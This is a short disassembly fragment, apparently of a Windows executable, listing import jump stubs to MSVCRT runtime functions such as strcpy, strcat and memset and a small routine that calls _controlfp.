+call [ __import_lookup_table_2(MSVCRT:exit) ]
+_EH_prolog
+jmp [ __import_lookup_table_2(MSVCRT:_EH_prolog) ]
+strcat
+jmp [ __import_lookup_table_2(MSVCRT:strcat) ]
+strcpy
+jmp [ __import_lookup_table_2(MSVCRT:strcpy) ]
+strlen
+jmp [ __import_lookup_table_2(MSVCRT:strlen) ]
+memset
+jmp [ __import_lookup_table_2(MSVCRT:memset) ]
+_XcptFilter
+jmp [ __import_lookup_table_2(MSVCRT:_XcptFilter) ]
+_initterm
+jmp [ _initterm@IAT ]
+sub_4024c8
+push 0x30000
+push 0x10000
+call _controlfp
+pop ecx
+pop ecx
+retn
+sub_4024dd
+retn
+_controlfp
+jmp [ _controlfp@IAT ]
